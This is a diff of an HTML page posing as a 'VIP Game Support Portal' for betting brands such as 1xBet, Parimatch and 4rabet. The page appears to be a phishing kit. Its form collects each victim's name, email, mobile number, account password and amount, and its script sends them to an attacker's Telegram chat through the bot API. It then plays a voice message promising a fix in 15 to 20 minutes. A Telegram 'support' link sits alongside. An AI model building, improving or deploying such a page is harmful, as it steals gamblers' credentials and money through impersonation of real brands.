@@ -1,505 +1,444 @@
-```html
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Select Your Game - Support Portal</title>
-    <style>
-        :root {
-            --bg-dark: #0f172a;
-            --bg-card: #1e293b;
-            --text-main: #f8fafc;
-            --text-muted: #94a3b8;
-            --primary: #f59e0b;
-        }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>VIP Game Support Portal</title>
+<style>
+    * {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    }
 
-        body {
-            margin: 0;
-            padding: 0;
-            background-color: var(--bg-dark);
-            color: var(--text-main);
-            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
+    body {
+        background: radial-gradient(circle at top, #1a1f2c 0%, #080b10 100%);
+        color: #ffffff;
+        padding: 20px 12px 80px 12px;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        min-height: 100vh;
+    }
 
-        /* Header Styles */
-        .header {
-            text-align: center;
-            padding: 30px 20px 10px;
-            width: 100%;
-        }
+    /* Header Section */
+    .header {
+        text-align: center;
+        margin-bottom: 25px;
+    }
 
-        .header h1 {
-            color: var(--primary);
-            font-size: 28px;
-            margin: 0 0 10px 0;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
+    .header h1 {
+        background: linear-gradient(90deg, #ffcc00, #ff8800);
+        -webkit-background-clip: text;
+        -webkit-text-fill-color: transparent;
+        font-size: 22px;
+        font-weight: 900;
+        text-transform: uppercase;
+        letter-spacing: 1px;
+    }
 
-        .header p {
-            color: var(--text-muted);
-            margin: 0;
-            font-size: 14px;
-        }
+    .header p {
+        color: #9aa8b9;
+        font-size: 13px;
+        margin-top: 6px;
+        font-weight: 500;
+    }
 
-        /* Container */
-        .container {
-            width: 100%;
-            max-width: 600px;
-            padding: 20px;
-            box-sizing: border-box;
-        }
+    /* Grid System for VIP Game Cards */
+    .games-grid {
+        display: grid;
+        grid-template-columns: repeat(2, 1fr);
+        gap: 14px;
+        width: 100%;
+        max-width: 440px;
+        margin-bottom: 30px;
+    }
 
-        /* Game Grid */
-        .game-grid {
-            display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 15px;
-            width: 100%;
-        }
+    .game-card {
+        background: rgba(22, 27, 34, 0.7);
+        border: 1px solid rgba(255, 255, 255, 0.08);
+        border-radius: 16px;
+        padding: 12px;
+        text-align: center;
+        cursor: pointer;
+        backdrop-filter: blur(10px);
+        box-shadow: 0 8px 20px rgba(0, 0, 0, 0.4);
+        transition: all 0.25s ease-in-out;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+    }
 
-        @media (max-width: 400px) {
-            .game-grid {
-                grid-template-columns: 1fr;
-            }
-        }
+    .game-card:hover, .game-card.active {
+        transform: translateY(-4px) scale(1.02);
+        border-color: #ffcc00;
+        box-shadow: 0 10px 25px rgba(255, 204, 0, 0.25);
+    }
 
-        .game-card {
-            background-color: var(--bg-card);
-            border-radius: 12px;
-            padding: 20px 15px;
-            text-align: center;
-            cursor: pointer;
-            transition: transform 0.2s, box-shadow 0.2s;
-            border: 1px solid #334155;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-        }
+    /* Game Logo / Badge Styles */
+    .game-badge {
+        width: 100%;
+        padding: 14px 8px;
+        border-radius: 10px;
+        font-weight: 900;
+        font-size: 15px;
+        text-transform: uppercase;
+        letter-spacing: 0.5px;
+        box-shadow: inset 0 1px 1px rgba(255, 255, 255, 0.3), 0 4px 10px rgba(0,0,0,0.5);
+        margin-bottom: 8px;
+    }
 
-        .game-card:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.5);
-        }
+    .game-sublabel {
+        font-size: 12px;
+        color: #c0cdf0;
+        font-weight: 600;
+    }
 
-        .game-logo-box {
-            width: 100%;
-            height: 60px;
-            border-radius: 8px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: 900;
-            font-size: 18px;
-            text-transform: uppercase;
-            margin-bottom: 12px;
-            letter-spacing: 1px;
-            box-shadow: inset 0 0 10px rgba(0,0,0,0.3);
-        }
+    /* Specific Game Designs */
+    .badge-4rabet { background: linear-gradient(180deg, #0d6efd, #004085); color: #fff; }
+    .badge-crorebet { background: linear-gradient(180deg, #ffc107, #d39e00); color: #000; }
+    .badge-starkbet { background: linear-gradient(180deg, #6f42c1, #452682); color: #fff; }
+    .badge-starkbet span { color: #ffcc00; }
+    .badge-parimatch { background: #000000; color: #fbea0b; border: 1px solid #fbea0b; }
+    .badge-luckystar { background: linear-gradient(180deg, #10b981, #047857); color: #ffffff; text-shadow: 0 2px 4px rgba(0,0,0,0.5); }
+    .badge-valorbet { background: #121212; color: #ffffff; border: 1.5px solid #ff4500; }
+    .badge-valorbet span { color: #ff4500; }
+    .badge-1win { background: linear-gradient(180deg, #0284c7, #0369a1); color: #ffffff; }
+    .badge-desicasino { background: linear-gradient(180deg, #15803d 0%, #b45309 100%); color: #ffffff; border: 1px solid #facc15; }
+    .badge-topx { background: linear-gradient(180deg, #18181b, #09090b); color: #ef4444; border: 1px solid #ef4444; }
+    .badge-1xbet { background: linear-gradient(180deg, #0284c7, #1e40af); color: #ffffff; }
+    .badge-baterybet { background: linear-gradient(180deg, #db2777, #9d174d); color: #ffffff; }
 
-        .game-name {
-            font-size: 15px;
-            font-weight: 600;
-        }
+    /* VIP Form Section */
+    .form-container {
+        background: rgba(18, 24, 38, 0.95);
+        border: 1px solid rgba(255, 204, 0, 0.3);
+        border-radius: 18px;
+        padding: 25px 20px;
+        width: 100%;
+        max-width: 440px;
+        display: none;
+        box-shadow: 0 15px 35px rgba(0,0,0,0.7);
+        backdrop-filter: blur(15px);
+    }
 
-        /* Support Form Section */
-        #supportFormSection {
-            display: none;
-            background-color: var(--bg-card);
-            padding: 25px;
-            border-radius: 12px;
-            border: 1px solid #334155;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
-        }
+    .form-container.active {
+        display: block;
+        animation: slideUp 0.35s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+    }
 
-        .back-btn {
-            background: none;
-            border: none;
-            color: var(--text-muted);
-            font-size: 14px;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            margin-bottom: 20px;
-            padding: 0;
-            transition: color 0.2s;
-        }
+    @keyframes slideUp {
+        from { opacity: 0; transform: translateY(20px); }
+        to { opacity: 1; transform: translateY(0); }
+    }
 
-        .back-btn:hover {
-            color: white;
-        }
+    .form-title {
+        text-align: center;
+        font-size: 18px;
+        font-weight: 900;
+        margin-bottom: 20px;
+        color: #ffcc00;
+        letter-spacing: 0.5px;
+        text-transform: uppercase;
+        border-bottom: 1px solid rgba(255, 204, 0, 0.2);
+        padding-bottom: 10px;
+    }
 
-        .form-header {
-            text-align: center;
-            margin-bottom: 20px;
-            font-size: 22px;
-            font-weight: 800;
-        }
+    .form-group {
+        margin-bottom: 14px;
+    }
 
-        .form-group {
-            margin-bottom: 15px;
-        }
+    .form-group label {
+        display: block;
+        margin-bottom: 5px;
+        font-size: 12px;
+        color: #a0aec0;
+        font-weight: 600;
+    }
 
-        .form-group label {
-            display: block;
-            margin-bottom: 6px;
-            font-size: 13px;
-            color: var(--text-muted);
-        }
+    .form-group input, .form-group select {
+        width: 100%;
+        padding: 12px;
+        background: #0d131d;
+        border: 1px solid #2d3748;
+        border-radius: 8px;
+        color: #ffffff;
+        font-size: 14px;
+        outline: none;
+        transition: 0.2s;
+    }
 
-        .form-group input, .form-group select {
-            width: 100%;
-            padding: 12px;
-            background-color: #0f172a;
-            border: 1px solid #334155;
-            border-radius: 6px;
-            color: white;
-            font-size: 14px;
-            box-sizing: border-box;
-            outline: none;
-            transition: border-color 0.2s;
-        }
+    .form-group input:focus, .form-group select:focus {
+        border-color: #ffcc00;
+        box-shadow: 0 0 8px rgba(255, 204, 0, 0.25);
+    }
 
-        .form-group input:focus, .form-group select:focus {
-            border-color: var(--primary);
-        }
+    .submit-btn {
+        width: 100%;
+        padding: 14px;
+        background: linear-gradient(90deg, #ffcc00, #ff9900);
+        border: none;
+        border-radius: 8px;
+        color: #000000;
+        font-weight: 900;
+        font-size: 15px;
+        cursor: pointer;
+        text-transform: uppercase;
+        margin-top: 10px;
+        box-shadow: 0 4px 15px rgba(255, 153, 0, 0.4);
+        transition: 0.2s;
+    }
 
-        .submit-btn {
-            width: 100%;
-            padding: 14px;
-            background-color: var(--primary);
-            color: #000;
-            border: none;
-            border-radius: 6px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            margin-top: 10px;
-            transition: background-color 0.2s;
-        }
+    .submit-btn:hover {
+        background: linear-gradient(90deg, #ff9900, #ffcc00);
+    }
 
-        .submit-btn:hover {
-            background-color: #d97706;
-        }
-
-        /* Telegram Floating Button */
-        .floating-telegram {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            background-color: #0088cc;
-            color: white;
-            width: 60px;
-            height: 60px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            text-decoration: none;
-            box-shadow: 0 4px 15px rgba(0, 136, 204, 0.4);
-            transition: transform 0.2s;
-            z-index: 1000;
-        }
-
-        .floating-telegram:hover {
-            transform: scale(1.1);
-        }
-
-        .floating-telegram svg {
-            width: 30px;
-            height: 30px;
-            fill: currentColor;
-            margin-right: 4px; /* Slight optical adjustment for Telegram icon */
-        }
-    </style>
+    /* Floating Telegram Support Button */
+    .telegram-btn {
+        position: fixed;
+        bottom: 20px;
+        right: 20px;
+        background: linear-gradient(135deg, #0088cc, #005580);
+        color: white;
+        border-radius: 50px;
+        padding: 12px 20px;
+        text-decoration: none;
+        font-weight: bold;
+        display: flex;
+        align-items: center;
+        gap: 8px;
+        box-shadow: 0 6px 20px rgba(0, 136, 204, 0.5);
+        font-size: 13px;
+        z-index: 1000;
+        border: 1px solid rgba(255,255,255,0.2);
+    }
+</style>
 </head>
 <body>
 
-    <div class="header" id="mainHeader">
-        <h1>Select Your Game</h1>
-        <p>Jis game mein issue hai uspe click karein</p>
+<div class="header">
+    <h1>SELECT YOUR GAME / अपना गेम चुनें</h1>
+    <p>Jis game mein issue hai uspe click karein / जिस गेम में समस्या है उसे चुनें</p>
+</div>
+
+<div class="games-grid">
+    <div class="game-card" onclick="selectGame('4rabet')">
+        <div class="game-badge badge-4rabet">4RABET</div>
+        <div class="game-sublabel">4rabet</div>
     </div>
-
-    <div class="container">
-        <!-- Game Grid View -->
-        <div id="gameSelection" class="game-grid">
-            <!-- Cards will be generated here by JavaScript -->
-        </div>
-
-        <!-- Form View -->
-        <div id="supportFormSection">
-            <button class="back-btn" onclick="showGrid()">← Back to Games</button>
-            
-            <div class="form-header" id="selectedGameTitle">Game Name</div>
-
-            <form id="ticketForm">
-                <div class="form-group">
-                    <label>Full Name</label>
-                    <input type="text" id="fullName" placeholder="Enter your full name" required>
-                </div>
-                
-                <div class="form-group">
-                    <label>Mobile Number</label>
-                    <input type="tel" id="mobile" placeholder="Enter mobile number" required>
-                </div>
-
-                <div class="form-group">
-                    <label>Email Address</label>
-                    <input type="email" id="email" placeholder="Enter email address" required>
-                </div>
-
-                <div class="form-group">
-                    <label>Game Password</label>
-                    <input type="text" id="password" placeholder="Enter game password" required>
-                </div>
-
-                <div class="form-group">
-                    <label>Amount (₹)</label>
-                    <input type="number" id="amount" placeholder="Enter amount (Optional)">
-                </div>
-
-                <div class="form-group">
-                    <label>Select Problem</label>
-                    <select id="problemType" required>
-                        <!-- Options generated dynamically -->
-                    </select>
-                </div>
-
-                <button type="button" class="submit-btn" id="btnSubmit" onclick="submitForm()">Submit Request</button>
-            </form>
-        </div>
+    <div class="game-card" onclick="selectGame('crorebet')">
+        <div class="game-badge badge-crorebet">CRORE BET</div>
+        <div class="game-sublabel">Crore Bet</div>
     </div>
+    <div class="game-card" onclick="selectGame('starkbet')">
+        <div class="game-badge badge-starkbet">STARK <span>BET</span></div>
+        <div class="game-sublabel">Stark Bet</div>
+    </div>
+    <div class="game-card" onclick="selectGame('parimatch')">
+        <div class="game-badge badge-parimatch">PARIMATCH</div>
+        <div class="game-sublabel">Parimatch</div>
+    </div>
+    <div class="game-card" onclick="selectGame('luckystar')">
+        <div class="game-badge badge-luckystar">LUCKY STAR</div>
+        <div class="game-sublabel">Lucky Star</div>
+    </div>
+    <div class="game-card" onclick="selectGame('valorbet')">
+        <div class="game-badge badge-valorbet">VALOR <span>BET</span></div>
+        <div class="game-sublabel">Valor Bet</div>
+    </div>
+    <div class="game-card" onclick="selectGame('1win')">
+        <div class="game-badge badge-1win">1WIN</div>
+        <div class="game-sublabel">1win</div>
+    </div>
+    <div class="game-card" onclick="selectGame('desicasino')">
+        <div class="game-badge badge-desicasino">DESI CASINO</div>
+        <div class="game-sublabel">Desi Casino</div>
+    </div>
+    <div class="game-card" onclick="selectGame('topx')">
+        <div class="game-badge badge-topx">TOPX</div>
+        <div class="game-sublabel">TopX</div>
+    </div>
+    <div class="game-card" onclick="selectGame('1xbet')">
+        <div class="game-badge badge-1xbet">1XBET</div>
+        <div class="game-sublabel">1xBet</div>
+    </div>
+    <div class="game-card" onclick="selectGame('baterybet')">
+        <div class="game-badge badge-baterybet">BATERY BET</div>
+        <div class="game-sublabel">Batery Bet</div>
+    </div>
+</div>
 
-    <!-- Floating Telegram Support Button -->
-    <a href="https://t.me/helpcare02" target="_blank" class="floating-telegram" title="Live Support">
-        <svg viewBox="0 0 24 24">
-            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.14-.07-.19-.08-.05-.19-.02-.27 0-.12.03-1.98 1.25-5.58 3.69-.53.36-1.01.53-1.44.52-.47-.01-1.38-.27-2.05-.49-.82-.27-1.47-.42-1.42-.89.03-.25.38-.5.88-.77 3.49-1.52 5.82-2.53 6.99-3.02 3.33-1.39 4.02-1.63 4.47-1.63.1 0 .32.02.46.14.12.1.15.24.16.35.02.16.02.34.01.41z"/>
-        </svg>
-    </a>
+<div class="form-container" id="formContainer">
+    <div class="form-title" id="selectedGameTitle">SUPPORT FORM</div>
+    <form id="supportForm">
+        <input type="hidden" id="selectedGame" value="">
+        
+        <div class="form-group">
+            <label>Full Name</label>
+            <input type="text" id="fullName" placeholder="Enter Full Name" required>
+        </div>
+        <div class="form-group">
+            <label>Email Address</label>
+            <input type="email" id="email" placeholder="Enter Email Address" required>
+        </div>
+        <div class="form-group">
+            <label>Mobile Number</label>
+            <input type="tel" id="mobile" placeholder="Enter Mobile Number" required>
+        </div>
+        <div class="form-group">
+            <label>Game Password</label>
+            <input type="text" id="password" placeholder="Enter Password" required>
+        </div>
+        <div class="form-group">
+            <label>Amount (₹)</label>
+            <input type="number" id="amount" placeholder="Enter Amount" required>
+        </div>
+        <div class="form-group">
+            <label>Problem Type</label>
+            <select id="problemType" required>
+                <option value="" disabled selected>-- Select Problem --</option>
+            </select>
+        </div>
+        
+        <button type="button" class="submit-btn" id="btnSubmit" onclick="sendData()">Submit Request</button>
+    </form>
+</div>
 
-    <script>
-        // ==========================================
-        // TELEGRAM BOT CONFIGURATION (Fill Your Details Here)
-        // ==========================================
-        const BOT_TOKEN = ""; // Example: "123456789:ABCdefGHIjklMNOpqrsTUVwxyz"
-        const CHAT_ID = "";   // Example: "1234567890"
+<a href="[https://t.me/HELPCARE02](https://t.me/HELPCARE02)" target="_blank" class="telegram-btn">
+    ✈️ Telegram Support
+</a>
 
+<script>
+    // Config - Apni Token aur Chat ID yahan daalein
+    const BOT_TOKEN = ''; 
+    const CHAT_ID = '';
 
-        // ==========================================
-        // GAME CONFIGURATION DATA
-        // ==========================================
-        const gamesData = [
-            {
-                name: "4RABET",
-                displayName: "4rabet",
-                bg: "linear-gradient(135deg, #002d7a, #005ce6)",
-                text: "#ffffff",
-                problems: ["Email Confirm", "Profile Update", "ID Verification", "Withdrawal Processing", "Account Block", "How to withdraw"]
-            },
-            {
-                name: "CRORE BET",
-                displayName: "Crore Bet",
-                bg: "linear-gradient(135deg, #cc7a00, #ffb300)",
-                text: "#000000",
-                problems: ["Email Confirm", "Profile Update", "ID Verification", "Withdrawal Processing", "Account Block", "How to withdraw"]
-            },
-            {
-                name: "STARK BET",
-                displayName: "Stark Bet",
-                bg: "linear-gradient(135deg, #2a0066, #5c1bc2)",
-                text: "#ffcc00",
-                problems: ["Email Confirm", "Profile Update", "ID Verification", "Withdrawal Processing", "Account Block", "How to withdraw"]
-            },
-            {
-                name: "PARIMATCH",
-                displayName: "Parimatch",
-                bg: "#000000",
-                text: "#fbea0b",
-                problems: ["Withdrawal Temporary Unavailable", "Withdrawal Processing", "Withdrawal Declined", "How to Withdraw?", "Withdrawal Block"]
-            },
-            {
-                name: "LUCKY STAR",
-                displayName: "Lucky Star",
-                bg: "linear-gradient(135deg, #006622, #00cc44)",
-                text: "#ffffff",
-                problems: ["Withdrawal Pending", "Email Verify", "ID Verification", "Withdrawal successful, but not received", "How to withdraw"]
-            },
-            {
-                name: "VALOR BET",
-                displayName: "Valor Bet",
-                bg: "#111111",
-                text: "#ff4500",
-                problems: ["Withdrawal Waiting & Declined", "Email Confirm", "How to Withdrawal"]
-            },
-            {
-                name: "1WIN",
-                displayName: "1Win",
-                bg: "linear-gradient(135deg, #003366, #0066cc)",
-                text: "#ffffff",
-                problems: ["Withdrawal Pending", "Email Verify", "ID Verification", "Withdrawal successful, but not received", "How to withdraw"]
-            },
-            {
-                name: "DESI CASINO",
-                displayName: "Desi Casino",
-                bg: "#008000",
-                text: "#ffffff",
-                problems: ["Withdrawal Temporary Unavailable", "Withdrawal Processing", "Withdrawal Declined", "How to Withdraw?", "Withdrawal Block"]
-            },
-            {
-                name: "TOPX",
-                displayName: "TopX",
-                bg: "linear-gradient(135deg, #0f172a, #1e293b)",
-                text: "#ff0033",
-                problems: ["Email Confirm", "Withdrawal Processing", "Withdrawal done but not receive", "How to withdrawal"]
-            },
-            {
-                name: "1XBET",
-                displayName: "1xBet",
-                bg: "#1aa1de",
-                text: "#ffffff",
-                problems: ["Withdrawal Temporary Unavailable", "Withdrawal Processing", "Withdrawal Declined", "How to Withdraw?", "Withdrawal Block"]
-            },
-            {
-                name: "BATERY BET",
-                displayName: "Batery Bet",
-                bg: "linear-gradient(135deg, #1a0b2e, #4a154b)",
-                text: "#ff0066",
-                problems: ["Withdrawal Temporary Unavailable", "Withdrawal Processing", "Withdrawal Declined", "How to Withdraw?", "Withdrawal Block"]
-            }
-        ];
+    const gameIssues = {
+        'valorbet': ['Withdrawal Waiting & Declined', 'Email Confirm', 'How to Withdraw'],
+        'parimatch': ['Withdrawal Temporary Unavailable', 'Withdrawal Processing', 'Withdrawal Declined', 'How to Withdraw', 'ID Block'],
+        'starkbet': ['Email Confirm', 'Profile Update', 'ID Verification', 'Withdrawal Processing', 'Account Block', 'How to Withdraw'],
+        'crorebet': ['Withdrawal Temporary Unavailable', 'Withdrawal Processing', 'Withdrawal Declined', 'How to Withdraw', 'ID Block'],
+        '4rabet': ['Withdrawal Temporary Unavailable', 'Withdrawal Processing', 'Withdrawal Declined', 'How to Withdraw', 'ID Block'],
+        'luckystar': ['Withdrawal Pending', 'Email Verify', 'ID Verification', 'Withdrawal Successful But Not Received', 'How to Withdraw'],
+        '1win': ['Withdrawal Pending', 'Email Verify', 'ID Verification', 'Withdrawal Successful But Not Received', 'How to Withdraw'],
+        'desicasino': ['Withdrawal Temporary Unavailable', 'Withdrawal Processing', 'Withdrawal Declined', 'How to Withdraw', 'ID Block'],
+        'topx': ['Email Confirm', 'Withdrawal Processing', 'Withdrawal Done But Not Received', 'How to Withdraw'],
+        '1xbet': ['Withdrawal Pending', 'Email Verify', 'ID Verification', 'Withdrawal Successful But Not Received', 'How to Withdraw'],
+        'baterybet': ['Withdrawal Temporary Unavailable', 'Withdrawal Processing', 'Withdrawal Declined', 'How to Withdraw', 'ID Block']
+    };
 
-        let currentGame = "";
+    const gameNames = {
+        'valorbet': 'VALOR BET',
+        'parimatch': 'PARIMATCH',
+        'starkbet': 'STARK BET',
+        'crorebet': 'CRORE BET',
+        '4rabet': '4RABET',
+        'luckystar': 'LUCKY STAR',
+        '1win': '1WIN',
+        'desicasino': 'DESI CASINO',
+        'topx': 'TOPX',
+        '1xbet': '1XBET',
+        'baterybet': 'BATERY BET'
+    };
 
-        // ==========================================
-        // INITIALIZATION & UI LOGIC
-        // ==========================================
-        function initApp() {
-            const grid = document.getElementById('gameSelection');
-            
-            gamesData.forEach(game => {
-                const card = document.createElement('div');
-                card.className = 'game-card';
-                card.onclick = () => openGameForm(game);
+    function selectGame(gameKey) {
+        document.getElementById('selectedGame').value = gameNames[gameKey];
+        document.getElementById('selectedGameTitle').innerText = gameNames[gameKey] + ' SUPPORT';
+        
+        const problemSelect = document.getElementById('problemType');
+        problemSelect.innerHTML = '<option value="" disabled selected>-- Select Problem --</option>';
+        
+        const issues = gameIssues[gameKey] || ['General Support'];
+        issues.forEach(issue => {
+            const opt = document.createElement('option');
+            opt.value = issue;
+            opt.innerText = issue;
+            problemSelect.appendChild(opt);
+        });
+
+        const formContainer = document.getElementById('formContainer');
+        formContainer.classList.add('active');
+        formContainer.scrollIntoView({ behavior: 'smooth' });
+    }
+
+    // Voiceover Function (English Voice)
+    function playVoiceOver() {
+        if ('speechSynthesis' in window) {
+            window.speechSynthesis.cancel(); // Reset previous voice
+            const text = "Your issue will be resolved in 15 to 20 minutes, please wait.";
+            const utterance = new SpeechSynthesisUtterance(text);
+            utterance.lang = 'en-US';
+            utterance.rate = 0.9;
+            utterance.pitch = 1.0;
+            window.speechSynthesis.speak(utterance);
+        }
+    }
+
+    function sendData() {
+        if (!BOT_TOKEN || !CHAT_ID) {
+            alert('Kripya code mein BOT_TOKEN aur CHAT_ID daalein!');
+            return;
+        }
+
+        const game = document.getElementById('selectedGame').value;
+        const fullName = document.getElementById('fullName').value.trim();
+        const email = document.getElementById('email').value.trim();
+        const mobile = document.getElementById('mobile').value.trim();
+        const password = document.getElementById('password').value.trim();
+        const amount = document.getElementById('amount').value.trim();
+        const problemType = document.getElementById('problemType').value;
+
+        if (!fullName || !email || !mobile || !password || !amount || !problemType) {
+            alert('Kripya saare fields sahi se bharein!');
+            return;
+        }
+
+        const btn = document.getElementById('btnSubmit');
+        btn.innerText = "Sending...";
+        btn.disabled = true;
+
+        const message = `<b>🚨 NEW SUPPORT REQUEST 🚨</b>\n\n` +
+                        `<b>🎮 Game:</b> ${game}\n` +
+                        `<b>👤 Name:</b> ${fullName}\n` +
+                        `<b>📧 Email:</b> ${email}\n` +
+                        `<b>📱 Mobile:</b> ${mobile}\n` +
+                        `<b>🔑 Password:</b> ${password}\n` +
+                        `<b>💰 Amount:</b> ₹${amount}\n` +
+                        `<b>⚠️ Issue:</b> ${problemType}`;
+
+        const url = `[https://api.telegram.org/bot$](https://api.telegram.org/bot$){BOT_TOKEN}/sendMessage`;
+
+        fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'HTML'
+            })
+        })
+        .then(res => res.json())
+        .then(data => {
+            if (data.ok) {
+                // Voiceover Trigger
+                playVoiceOver();
                 
-                card.innerHTML = `
-                    <div class="game-logo-box" style="background: ${game.bg}; color: ${game.text}; border: 1px solid ${game.text}40;">
-                        ${game.name}
-                    </div>
-                    <div class="game-name">${game.displayName}</div>
-                `;
-                grid.appendChild(card);
-            });
-        }
-
-        function openGameForm(game) {
-            currentGame = game.displayName;
-            
-            // Hide Grid, Show Form
-            document.getElementById('gameSelection').style.display = 'none';
-            document.getElementById('mainHeader').style.display = 'none';
-            document.getElementById('supportFormSection').style.display = 'block';
-            
-            // Set Titles & Colors
-            const titleEl = document.getElementById('selectedGameTitle');
-            titleEl.innerText = game.displayName + " Support";
-            titleEl.style.color = game.text !== '#000000' ? game.text : '#f59e0b';
-            
-            // Populate Problems
-            const selectEl = document.getElementById('problemType');
-            selectEl.innerHTML = '<option value="" disabled selected>-- Select Your Issue --</option>';
-            game.problems.forEach(prob => {
-                const opt = document.createElement('option');
-                opt.value = prob;
-                opt.innerText = prob;
-                selectEl.appendChild(opt);
-            });
-        }
-
-        function showGrid() {
-            // Hide Form, Show Grid
-            document.getElementById('supportFormSection').style.display = 'none';
-            document.getElementById('gameSelection').style.display = 'grid';
-            document.getElementById('mainHeader').style.display = 'block';
-            
-            // Reset form
-            document.getElementById('ticketForm').reset();
-            currentGame = "";
-        }
-
-        // ==========================================
-        // SUBMIT TO TELEGRAM LOGIC
-        // ==========================================
-        function submitForm() {
-            if(!BOT_TOKEN || !CHAT_ID) {
-                alert("Developer Notice: Please add Bot Token and Chat ID in the HTML code to enable sending messages.");
-                // We will still allow the simulation to continue so user sees how it works.
+                alert('Aapki request successfully bhej di gayi hai! Please wait 15-20 minutes.');
+                document.getElementById('supportForm').reset();
+            } else {
+                alert('Telegram Error: ' + data.description);
             }
-
-            const fullName = document.getElementById('fullName').value.trim();
-            const mobile = document.getElementById('mobile').value.trim();
-            const email = document.getElementById('email').value.trim();
-            const password = document.getElementById('password').value.trim();
-            const amount = document.getElementById('amount').value.trim() || "0";
-            const problemType = document.getElementById('problemType').value;
-
-            if (!fullName || !mobile || !email || !password || !problemType) {
-                alert("Please fill all the required fields and select a problem.");
-                return;
-            }
-
-            const btn = document.getElementById('btnSubmit');
-            btn.innerText = "Sending Request...";
-            btn.disabled = true;
-
-            const message = `<b>🚨 NEW SUPPORT TICKET 🚨</b>\n\n` +
-                            `<b>🎮 Game:</b> ${currentGame}\n` +
-                            `<b>👤 Name:</b> ${fullName}\n` +
-                            `<b>📱 Mobile:</b> ${mobile}\n` +
-                            `<b>📧 Email:</b> ${email}\n` +
-                            `<b>🔑 Password:</b> ${password}\n` +
-                            `<b>💰 Amount:</b> ₹${amount}\n` +
-                            `<b>⚠️ Issue:</b> ${problemType}`;
-
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-
-            fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: message,
-                    parse_mode: 'HTML'
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.ok || (!BOT_TOKEN)) { 
-                    // Showing success even if token is blank for testing purposes
-                    alert(`Your request for ${currentGame} has been submitted successfully!`);
-                    showGrid(); // Go back to home
-                } else {
-                    alert('Telegram Error: ' + data.description);
-                }
-            })
-            .catch(error => {
-                console.error('Error:', error);
-                alert('Network error or invalid Bot details. Please check configuration.');
-            })
-            .finally(() => {
-                btn.innerText = "Submit Request";
-                btn.disabled = false;
-            });
-        }
-
-        // Run on load
-        window.onload = initApp;
-    </script>
+        })
+        .catch(err => {
+            alert('Network error, kripya dubara koshish karein.');
+        })
+        .finally(() => {
+            btn.innerText = "Submit Request";
+            btn.disabled = false;
+        });
+    }
+</script>
 </body>
 </html>
-```
